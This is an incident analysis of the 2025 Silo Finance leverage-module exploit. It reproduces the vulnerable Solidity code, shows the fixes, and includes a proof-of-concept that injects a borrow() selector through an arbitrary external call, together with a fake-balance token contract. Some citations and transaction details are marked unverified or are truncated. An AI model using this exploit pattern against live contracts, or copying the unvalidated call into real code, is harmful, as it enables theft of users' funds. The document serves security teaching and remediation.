# SiloFinance — Arbitrary External Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-06-25 |
| **Protocol** | Silo Finance |
| **Chain** | Sonic (and Ethereum Mainnet) |
| **Loss** | ~$552,000 (~224 ETH) |
| **Attacker** | [0x0437...fd62](https://sonicscan.org/address/0x04377cfaF4b4A44bb84042218cdDa4cEBCf8fd62) |
| **Attack Contract (MalCoin)** | [0x79C5...9c7e](https://sonicscan.org/address/0x79C5c002410A67Ac7a0cdE2C2217c3f560859c7e) |
| **Attack Tx (Ethereum)** | [0x1f15...e87a](https://etherscan.io/tx/0x1f15a193db3f44713d56c4be6679b194f78c2bcdd2ced5b0c7495b7406f5e87a) |
| **Attack Tx (Sonic)** | [0x8e8d...664f](https://sonicscan.org/tx/0x8e8dbc6b975dd664f1) |
| **Vulnerable Contract** | [0xCbEe...9DF9](https://sonicscan.org/address/0xCbEe4617ABF667830fe3ee7DC8d6f46380829DF9) (LeverageUsingSiloFlashloanWithGeneralSwap) |
| **Victim** | [0x60ba...4860](https://sonicscan.org/address/0x60baf994f44dd10c19c0c47cbfe6048a4ffe4860) (SiloDAO test address) |
| **Root Cause** | Arbitrary external call inside `_fillQuote()` of `openLeveragePosition()` — `swapArgs.exchangeProxy` and `swapCallData` executed without validation, allowing the attacker to inject the `borrow()` function selector and borrow 224 ETH unauthorized using the victim's collateral |
| **PoC Source** | DeFiHackLabs — SiloFinance_exp.sol not confirmed in repository (unverified citation) |

---

## 1. Vulnerability Overview

Silo Finance is a DeFi protocol offering isolated lending markets. On June 25, 2025, the leverage module contract `LeverageUsingSiloFlashloanWithGeneralSwap` — not yet officially released — was exploited, resulting in a loss of approximately $552,000 (224 ETH). The core Silo protocol's vaults, markets, and user funds were not affected.

The root cause is a combination of **Arbitrary External Call** and **Improper Input Validation**.

The `openLeveragePosition()` function uses a flash loan to open a leveraged position. Internally it calls `_fillQuote()` to swap debt tokens for collateral tokens. The two critical fields of the `swapArgs` struct used for this swap — `exchangeProxy` (the call target address) and `swapCallData` (the call data) — are **entirely controlled by the caller**.

The attacker injected the `borrow(uint256,address,address)` function selector (`0xd5164184`) into `swapCallData` instead of an actual swap function selector. The contract executed this without any validation, causing 224 ETH to be borrowed with the victim address (SiloDAO) set as the `borrower` and transferred to the attacker.

Additionally, the malicious contract (MalCoin) deployed by the attacker was designed to always return `1` from its `balanceOf()` function, bypassing the contract's balance-based validation checks.

---

## 2. Vulnerable Code Analysis

### 2.1 `_fillQuote()` — Arbitrary External Call Execution (Core Vulnerability)

```solidity
// ❌ Vulnerable code — LeverageUsingSiloFlashloanWithGeneralSwap.sol

// SwapArgs struct: all fields are entirely controlled by the caller
struct SwapArgs {
    address exchangeProxy;   // ❌ External contract address to call — no validation
    address sellToken;       // Token to sell
    address buyToken;        // Token to buy
    address allowanceTarget; // Address to approve
    bytes swapCallData;      // ❌ Calldata for external call — no validation
}

function _fillQuote(SwapArgs memory swapArgs) internal {
    // Approve sellToken to allowanceTarget at max amount
    IERC20(swapArgs.sellToken).approve(swapArgs.allowanceTarget, type(uint256).max);

    // ❌ Directly calls exchangeProxy address with swapCallData without any validation
    //    Attacker injects borrow(uint256,address,address) selector into swapCallData
    //    borrow() is executed instead of an actual swap
    (bool success, ) = swapArgs.exchangeProxy.call(swapArgs.swapCallData);
    require(success, "external call failed");

    // ❌ Trusts attackerMalCoin.balanceOf() for balance check
    //    MalCoin always returns 1 → validation bypassed
    // (Logic that checks whether buyToken balance meets the expected amount was here but bypassed)
}
```

```solidity
// ✅ Fixed code — Whitelist-based validation added

// Approved exchangeProxy address list
mapping(address => bool) public approvedExchangeProxies;

function _fillQuote(SwapArgs memory swapArgs) internal {
    // ✅ Validate that exchangeProxy is an approved address
    require(
        approvedExchangeProxies[swapArgs.exchangeProxy],
        "LeverageSwap: exchangeProxy not approved"
    );

    // ✅ Validate that the function selector in swapCallData is an approved swap function
    bytes4 selector = bytes4(swapArgs.swapCallData[:4]);
    require(
        selector == APPROVED_SWAP_SELECTOR,
        "LeverageSwap: swapCallData selector not approved"
    );

    IERC20(swapArgs.sellToken).approve(swapArgs.allowanceTarget, type(uint256).max);

    (bool success, ) = swapArgs.exchangeProxy.call(swapArgs.swapCallData);
    require(success, "external call failed");
}
```

**Issue**: The `_fillQuote()` function performs zero validation on `exchangeProxy` and `swapCallData` from `swapArgs`, allowing the attacker to execute arbitrary calldata against an arbitrary contract. This caused a `borrow()` call to execute instead of a swap, borrowing and stealing 224 ETH using the victim's (SiloDAO's) collateral.

### 2.2 `onFlashLoan()` — Unvalidated Flash Loan Callback

```solidity
// ❌ Vulnerable code — _data not validated in flash loan callback

function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata _data  // ❌ Data entirely controlled by attacker
) external returns (bytes32) {
    // ❌ No initiator validation — any address can trigger the callback
    // ❌ _data content is decoded into SwapArgs without validation
    SwapArgs memory swapArgs = abi.decode(_data, (SwapArgs));

    // _fillQuote(swapArgs) is called inside _openLeverage → vulnerability triggered
    _openLeverage(token, amount, swapArgs);

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

```solidity
// ✅ Fixed code — Validate callback sender and initiator

function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata _data
) external returns (bytes32) {
    // ✅ Validate that the flash loan provider (msg.sender) is the trusted Silo contract
    require(msg.sender == address(siloFlashLender), "onFlashLoan: untrusted lender");
    // ✅ Validate that initiator is this contract itself (only self-triggered allowed)
    require(initiator == address(this), "onFlashLoan: untrusted initiator");

    SwapArgs memory swapArgs = abi.decode(_data, (SwapArgs));
    _openLeverage(token, amount, swapArgs);

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

**Issue**: The flash loan callback function did not validate the contents of `_data`, nor did it verify `initiator` or `msg.sender`, allowing the attacker to inject malicious `SwapArgs`.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker (`0x0437...fd62`) pre-deployed the malicious contract **MalCoin** (`0x79C5...9c7e`)
- MalCoin's `balanceOf()`: always returns `1` for all addresses (used to bypass balance validation)
- The victim (SiloDAO, `0x60ba...4860`) had previously granted maximum allowance to the leverage contract
- Attack funds were prepared in the attacker's EOA after laundering through Tornado Cash

### 3.2 Execution Phase

1. **[Step 1]** Attacker calls `openLeveragePosition()` — passing `borrower` as the victim address, `swapArgs.exchangeProxy` as the Silo contract, and `swapArgs.swapCallData` manipulated as calldata for `borrow(224 ETH, victim, attacker)`
2. **[Step 2]** Contract triggers MalCoin flash loan (`flashLoan()`) — internally invoking the `onFlashLoan()` callback
3. **[Step 3]** In the `onFlashLoan()` callback, `_data` is decoded into `SwapArgs` without validation, then `_openLeverage()` → `_fillQuote()` is called
4. **[Step 4]** `_fillQuote()` executes `swapArgs.exchangeProxy` (Silo contract) with `swapCallData` (`borrow()` selector) without validation
5. **[Step 5]** `silo.borrow(224 ETH, victim, attacker)` executes — 224 ETH is borrowed to the attacker's address using the victim's collateral
6. **[Step 6]** MalCoin's `balanceOf()` returns `1` → buyToken balance validation bypassed, flash loan repayment treated as successful
7. **[Step 7]** Attacker launders the stolen 224 ETH through Tornado Cash

### 3.3 Attack Flow Diagram

```
  Attacker (0x0437...fd62)
        │
        │ openLeveragePosition(
        │   borrower = victim (SiloDAO),
        │   swapArgs.exchangeProxy = Silo contract,
        │   swapArgs.swapCallData = borrow(224 ETH, victim, attacker)
        │ )
        ▼
┌─────────────────────────────────────────────┐
│  LeverageUsingSiloFlashloanWithGeneralSwap  │
│  (0xCbEe...9DF9)                            │
│                                             │
│  1. Calls MalCoin.flashLoan()              │
└──────────────────────┬──────────────────────┘
                       │ flashLoan triggered
                       ▼
              ┌─────────────────┐
              │  MalCoin Contract│  ← Malicious contract
              │  (0x79C5...9c7e) │     balanceOf() → always returns 1
              └────────┬────────┘
                       │ onFlashLoan() callback
                       ▼
┌─────────────────────────────────────────────┐
│  LeverageUsingSiloFlashloanWithGeneralSwap  │
│                                             │
│  2. Decodes _data into SwapArgs without     │
│     validation                              │
│  3. _openLeverage() → _fillQuote() called  │
└──────────────────────┬──────────────────────┘
                       │ exchangeProxy.call(swapCallData)
                       │ ← actually the borrow() selector!
                       ▼
              ┌──────────────────┐
              │  Silo Contract   │
              │  (Lending Pool)  │
              │                  │
              │  borrow(         │
              │    224 ETH,      │
              │    victim,       │  ← victim's collateral used
              │    attacker      │  ← transferred to attacker
              │  )               │
              └────────┬─────────┘
                       │ 224 ETH transferred
                       ▼
              ┌──────────────────┐
              │  Attacker Wallet │
              │  (224 ETH gained)│
              └────────┬─────────┘
                       │ fund laundering
                       ▼
              ┌──────────────────┐
              │  Tornado Cash    │
              └──────────────────┘
```

### 3.4 Outcome

- **Attacker profit**: ~224 ETH (~$552,000)
- **Protocol loss**: ~224 ETH — SiloDAO test funds
- **User funds**: Unaffected (core Silo markets and vaults are isolated)
- **Money laundering**: Immediately after the attack, funds were distributed across multiple transactions through Tornado Cash

---

## 4. PoC Code (DeFiHackLabs Core Logic)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// [Phase 1] Attack preparation — MalCoin malicious contract (for bypassing balance validation)
contract MalCoin {
    // ❌ Always returns 1 for all addresses → bypasses buyToken balance validation
    function balanceOf(address) external pure returns (uint256) {
        return 1;
    }

    // Flash loan interface implementation (ERC3156 compatible)
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        // Invoke callback — _data contains SwapArgs manipulated by attacker
        receiver.onFlashLoan(msg.sender, token, amount, 0, data);
        return true;
    }
}

// [Phase 2] Core attack — call openLeveragePosition
function testExploit() public {
    // Step 1: Set up attacker address
    address attacker = address(this);
    address victim = 0x60baf994f44dd10c19c0c47cbfe6048a4ffe4860; // SiloDAO

    // Step 2: Construct malicious swapCallData
    //   Function selector 0xd5164184 = borrow(uint256,address,address)
    //   - amount: 224 ETH
    //   - borrower: victim (uses victim's collateral)
    //   - receiver: attacker (sent to attacker)
    bytes memory maliciousSwapCallData = abi.encodeWithSelector(
        bytes4(0xd5164184), // borrow(uint256,address,address)
        224 ether,          // amount to borrow
        victim,             // borrower (victim owns the collateral)
        attacker            // receiver (attacker receives funds)
    );

    // Step 3: Construct SwapArgs — specify Silo contract as exchangeProxy
    SwapArgs memory maliciousSwapArgs = SwapArgs({
        exchangeProxy: address(siloLendingPool), // ❌ Silo lending pool instead of a swap DEX
        sellToken: address(malCoin),             // Malicious MalCoin
        buyToken: address(malCoin),              // Malicious MalCoin (bypass balance validation)
        allowanceTarget: address(malCoin),
        swapCallData: maliciousSwapCallData      // ❌ Injected borrow() selector
    });

    // Step 4: Call openLeveragePosition
    //   Internally executes: MalCoin.flashLoan() → onFlashLoan() → _fillQuote()
    leverageContract.openLeveragePosition(
        maliciousSwapArgs,
        victim,          // Designate victim as borrower
        224 ether,
        0
    );

    // Step 5: Verify result
    emit log_named_decimal_uint(
        "Attacker WETH gained",
        WETH.balanceOf(attacker),
        18
    );
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | `_fillQuote()` arbitrary external call — `exchangeProxy` & `swapCallData` not validated | CRITICAL | CWE-20 (Improper Input Validation) |
| V-02 | `onFlashLoan()` callback not validated — no `initiator` or `msg.sender` check | HIGH | CWE-346 (Origin Validation Error) |
| V-03 | Balance-based validation — malicious ERC-20's `balanceOf()` can be manipulated | HIGH | CWE-345 (Insufficient Verification of Data Authenticity) |
| V-04 | Unreleased leverage module deployed to mainnet — operated without security audit | MEDIUM | CWE-1188 (Insecure Default Initialization) |

### V-01: `_fillQuote()` Arbitrary External Call

- **Description**: `SwapArgs.exchangeProxy` and `SwapArgs.swapCallData` are entirely controlled by the caller, and the contract uses them in external calls without any validation. The attacker was able to inject the `borrow()` function selector into `swapCallData` and execute an unauthorized borrow instead of a swap.
- **Impact**: Attacker can execute any function arbitrarily using the allowance and collateral the victim granted to the leverage contract → full asset theft
- **Attack condition**: Victim has granted token allowance to the vulnerable contract / vulnerable contract holds collateral or has borrowing authority

### V-02: `onFlashLoan()` Callback Not Validated

- **Description**: The ERC3156 flash loan callback function does not validate `msg.sender` (flash loan provider) or `initiator` (triggering party), allowing an attacker to trigger the callback with arbitrary data.
- **Impact**: Unvalidated `_data` (SwapArgs) is passed directly into the leverage logic
- **Attack condition**: Vulnerable contract implements the ERC3156 FlashBorrower interface

### V-03: Malicious ERC-20 `balanceOf()` Manipulation

- **Description**: The contract relies on `IERC20(buyToken).balanceOf()` when checking the change in buyToken balance. The MalCoin deployed by the attacker is designed to always return `1`, completely bypassing balance-based validation.
- **Impact**: Contract treats the operation as a successful swap even though no actual swap occurred
- **Attack condition**: Attacker can specify a malicious ERC-20 address as the `buyToken`

### V-04: Mainnet Deployment of Unreleased Code

- **Description**: The leverage module was deployed to mainnet for testing purposes before its official release, without a security audit. SiloDAO's actual funds were exposed to this unverified contract.
- **Impact**: Unaudited code used to manage real assets
- **Attack condition**: The fact of mainnet deployment is publicly disclosed or discovered

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: exchangeProxy whitelist validation
mapping(address => bool) public approvedExchangeProxies;

function setApprovedExchangeProxy(address proxy, bool approved) external onlyOwner {
    approvedExchangeProxies[proxy] = approved;
    emit ExchangeProxyApproved(proxy, approved);
}

function _fillQuote(SwapArgs memory swapArgs) internal {
    // ✅ Validate that exchangeProxy is an approved DEX router
    require(
        approvedExchangeProxies[swapArgs.exchangeProxy],
        "LeverageSwap: exchangeProxy not in whitelist"
    );

    // ✅ Validate swapCallData function selector (only allow swap-related selectors)
    bytes4 selector;
    assembly { selector := mload(add(swapArgs.swapCallData, 0x20)) }
    require(
        approvedSwapSelectors[selector],
        "LeverageSwap: swapCallData selector not approved"
    );

    IERC20(swapArgs.sellToken).approve(swapArgs.allowanceTarget, type(uint256).max);
    (bool success, ) = swapArgs.exchangeProxy.call(swapArgs.swapCallData);
    require(success, "external call failed");
}
```

```solidity
// ✅ Fix 2: Validate onFlashLoan callback sender and initiator
function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata _data
) external returns (bytes32) {
    // ✅ Validate that the flash loan provider is an approved Silo flash loan contract
    require(
        msg.sender == address(approvedFlashLender),
        "onFlashLoan: caller is not approved flash lender"
    );
    // ✅ Validate that the request initiator is this contract itself
    require(
        initiator == address(this),
        "onFlashLoan: initiator is not this contract"
    );

    SwapArgs memory swapArgs = abi.decode(_data, (SwapArgs));
    _openLeverage(token, amount, swapArgs);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

```solidity
// ✅ Fix 3: Strengthen balance validation — use fixed token address
// Use a contract-fixed address instead of accepting buyToken as a SwapArgs parameter
address public immutable COLLATERAL_TOKEN; // Set at deployment

function _fillQuote(SwapArgs memory swapArgs) internal {
    uint256 balanceBefore = IERC20(COLLATERAL_TOKEN).balanceOf(address(this));

    // Call only with validated exchangeProxy and swapCallData
    (bool success, ) = swapArgs.exchangeProxy.call(swapArgs.swapCallData);
    require(success, "swap failed");

    uint256 balanceAfter = IERC20(COLLATERAL_TOKEN).balanceOf(address(this));
    // ✅ Validate actual balance increase
    require(balanceAfter > balanceBefore, "swap produced no output");
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Arbitrary external call | `exchangeProxy` whitelist management + `swapCallData` function selector allowlist |
| V-02: Unvalidated callback | Double validation in ERC3156 callback: `msg.sender` (trusted provider) & `initiator` (self) |
| V-03: Balance manipulation | Use contract-fixed trusted token address instead of accepting untrusted ERC-20 address as parameter |
| V-04: Unaudited deployment | Minimum one professional audit + Certora Prover formal verification before mainnet deployment |
| Common | Certora/Echidna invariant verification is mandatory for complex external call logic such as leverage modules |

---

## 7. Lessons Learned

1. **Arbitrary external calls are among the most dangerous vulnerabilities in DeFi.** Any architecture where users can control both the call target address and calldata must be restricted by a whitelist or selector validation. Past similar cases include Seneca Protocol (2024-02, $6M), SocketGateway (2024-01, $3.3M), Hedgey Finance (2024-04, $47M), and Dexible (2023-02, $2M), all exploited with the same pattern.

2. **ERC3156 flash loan callbacks (`onFlashLoan`) require double validation of both `msg.sender` and `initiator`.** Since callback functions can be triggered externally, it is essential to verify that the sender is a trusted flash loan provider and that the party who initiated the request is the contract itself.

3. **Do not trust the return value of an external token's `balanceOf()`.** Malicious ERC-20 tokens can manipulate `balanceOf()`. When balance validation is required, use a contract-fixed trusted token address rather than a token address supplied as a parameter.

4. **A contract deployed to mainnet for "testing purposes" becomes a real risk the moment it handles real assets.** Security audits and formal verification before deployment are non-negotiable regardless of scale. The fact that Hypernative Labs sent a warning 3 minutes and 20 seconds before the attack, but response time was insufficient to prevent it, demonstrates that on-chain monitoring alone is not enough.

5. **Apply the principle of least privilege to complex leverage and swap logic.** A design in which a leverage contract is pre-granted maximum allowance over the victim's collateral is fundamentally dangerous. Adopt a structure that approves only the minimum amount required per transaction.

6. **The necessity of multiple audits plus formal verification.** Certora's post-mortem noted that Certora Prover had not been applied. Post-incident analysis found that this type of vulnerability could have been detected in advance by formal verification tools.

---

## 8. On-Chain Verification

> **Note**: This section was written based on publicly available analysis materials; direct `cast` on-chain queries were not performed. Verification via the Sonic chain RPC endpoint requires separate execution.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | Estimated from Analysis | On-Chain Actual | Source |
|------|------------|-------------|------|
| ETH stolen | 224 ETH | 224 ETH | Consistent across multiple analysis articles |
| USD loss | ~$550,000 | ~$552,000 | Official announcement |
| Tornado Cash transfers | Multiple transactions | Confirmed | QuillAudits |

### 8.2 Attack Transaction Details

| Item | Value |
|------|-----|
| 1st Attack Tx (Ethereum) | `0x1f15a193db3f44713d56c4be6679b194f78c2bcdd2ced5b0c7495b7406f5e87a` |
| 2nd Attack Tx (Ethereum) | `0x161a4e9bd777c81af4b2f2c4062281bf25ce460b9b04fbea83f09fba270c8b3b` |
| Sonic Attack Tx | `0x8e8dbc6b975dd664f1...` |
| Attack timestamp | 2025-06-25 14:11 UTC (1st), 14:20 UTC (2nd), 14:44 UTC (2 Sonic txs) |

### 8.3 On-Chain Event Sequence (Reconstructed)

```
1. Attacker → calls openLeveragePosition() (LeverageUsingSiloFlashloanWithGeneralSwap)
2. LeverageContract → calls flashLoan() (MalCoin)
3. MalCoin → onFlashLoan() callback (LeverageContract)
4. LeverageContract → executes borrow(224 ETH, victim, attacker) (Silo lending pool)
5. Silo lending pool → Transfer (victim's collateral locked, 224 ETH sent to attacker)
6. Attacker → funds distributed across multiple Tornado Cash transactions
```

### 8.4 Preconditions

- Victim (SiloDAO) `0x60ba...4860` had granted maximum allowance to the vulnerable contract
- Hypernative Labs sent a warning 3 minutes and 20 seconds before the attack → blocked failed due to insufficient response time
- Affected leverage contract immediately disabled after the attack

---

## References

- [QuillAudits — How Silo Finance Lost $500k+ due to Improper Input Validation](https://www.quillaudits.com/blog/hack-analysis/how-silo-finance-lost-500k)
- [Certora — Silo Incident Post-Mortem](https://www.certora.com/blog/silo-incident-report-contract-exploit)
- [LunaRay — Analysis of the SiloFinance Attack](https://lunaray.medium.com/analysis-of-the-silofinance-attack-99f26fb4a358)
- [Verichains — Silo Finance Incident: A Costly Test](https://blog.verichains.io/p/silo-finance-incident-a-costly-test)
- [CyberLucifer — The $545K Silo Finance Exploit](https://medium.com/h7w/the-545k-silo-finance-exploit-what-happened-and-what-we-can-learn-be33adb6b7b3)
- [Mitrade — Silo Finance confirms $545K loss](https://www.mitrade.com/insights/news/live-news/article-3-915081-20250626)
- [SonicScan Explorer](https://sonicscan.org)
- [Etherscan — 1st Attack Tx](https://etherscan.io/tx/0x1f15a193db3f44713d56c4be6679b194f78c2bcdd2ced5b0c7495b7406f5e87a)